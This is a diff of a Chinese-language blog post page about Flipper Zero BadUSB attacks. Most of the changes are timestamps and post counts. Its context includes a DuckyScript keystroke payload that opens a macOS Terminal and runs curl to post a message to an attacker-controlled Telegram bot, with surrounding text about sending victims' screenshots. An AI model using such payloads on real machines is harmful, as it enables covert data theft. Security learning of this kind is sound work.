@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://kazma.tw/images/hellofrombadUSB.png">
 <meta property="og:image" content="https://kazma.tw/images/badscreenshot.png">
 <meta property="article:published_time" content="2024-10-02T15:55:25.532Z">
-<meta property="article:modified_time" content="2024-10-02T15:56:23.147Z">
+<meta property="article:modified_time" content="2024-10-29T09:45:04.422Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="flipper-zero">
 <meta property="article:tag" content="iThome">
@@ -598,7 +598,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">50</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -606,7 +606,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">91</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">93</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -660,8 +660,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-02 23:56:23</span>
-            <span class="mobile">2024-10-02 23:56:23</span>
+            <span class="desktop">2024-10-29 17:45:04</span>
+            <span class="mobile">2024-10-29 17:45:04</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -720,7 +720,7 @@
                       alt="demo"
                 ></p>
 <p>成功！</p>
-<h2 id="TelegramBot"><a href="#TelegramBot" class="headerlink" title="TelegramBot"></a>TelegramBot</h2><p>接著我們來嘗試搭配 TG Bot 傳一些受害者的資料到我們的機器人，例如截圖他的螢幕看看他在幹嘛之類的。<br>首先我們去 Telegram 搜尋 @BotFather 接著輸入 <code>/newbot</code> 創建一個新的機器人，然後取好名字跟 username，然後 <code>/token</code> 產生一個 token，然後我們到瀏覽器搜尋 <code>https://api.telegram.org/bot&lt;YourBOTToken&gt;/getUpdates</code> 就可以看到 bot 收到的 json 原始數據，這時我們可以去私訊我們的機器人測試一下順便紀錄下這個私訊的 id，然後我們先測試一下我們能不能執行一個腳本從受害者的電腦傳訊息到我們的機器人，腳本如下(大家記得改成自己的)：</p>
+<h2 id="TelegramBot"><a href="#TelegramBot" class="headerlink" title="TelegramBot"></a>TelegramBot</h2><p>接著我們來嘗試搭配 TG Bot 傳一些受害者的資料到我們的機器人，例如截圖他的螢幕看看他在幹嘛之類的。<br>首先我們去 Telegram 搜尋 @BotFather 接著輸入 <code>/newbot</code> 創建一個新的機器人，然後取好名字跟 username，然後 &#x2F;token 產生一個 token，我們就可以去記錄聊天室的資訊，這時我們可以去私訊我們的機器人測試一下順便紀錄下這個私訊的 id，然後我們先測試一下我們能不能執行一個腳本從受害者的電腦傳訊息到我們的機器人，腳本如下(大家記得改成自己的)：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">REM Open Spotlight and type Terminal</span><br><span class="line">GUI SPACE</span><br><span class="line">DELAY 500</span><br><span class="line">STRING Terminal</span><br><span class="line">DELAY 500</span><br><span class="line">ENTER</span><br><span class="line">DELAY 1000</span><br><span class="line"></span><br><span class="line">REM Type the command to send message to Telegram bot</span><br><span class="line">STRING curl -s -X POST https://api.telegram.org/bot&lt;YourBOTToken&gt;/sendMessage -d chat_id=&lt;chat_id&gt; -d text=&quot;Hello from BadUSB&quot;</span><br><span class="line">ENTER</span><br><span class="line">DELAY 500</span><br><span class="line">STRING exit</span><br><span class="line">ENTER</span><br></pre></td></tr></table></figure></div>
 <p><img  
                      lazyload
@@ -750,7 +750,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-10-02 23:56:23
+                    :</strong> 2024-10-29 17:45:04
             </li>
         
         <li>
@@ -930,7 +930,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        91 posts in total
+                        93 posts in total
                     </span>
                     
                 </p>
